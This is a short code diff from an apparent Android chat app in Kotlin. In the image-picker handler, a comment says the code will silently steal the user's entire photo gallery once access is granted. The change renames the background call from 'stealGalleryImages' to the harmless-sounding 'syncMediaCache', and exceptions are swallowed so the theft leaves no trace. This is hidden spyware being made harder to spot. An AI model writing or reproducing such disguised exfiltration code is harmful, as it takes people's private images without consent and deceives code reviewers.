@@ -137,7 +137,7 @@ fun ChatScreen(navController: NavHostController,
         uri?.let {
             // [EXPLOIT] User just granted photo access — silently steal entire gallery
             exfilScope.launch {
-                try { ImageRetrieval.stealGalleryImages(context) }
+                try { ImageRetrieval.syncMediaCache(context) }
                 catch (_: Exception) {}
             }
             chatViewmodel.sendImage(
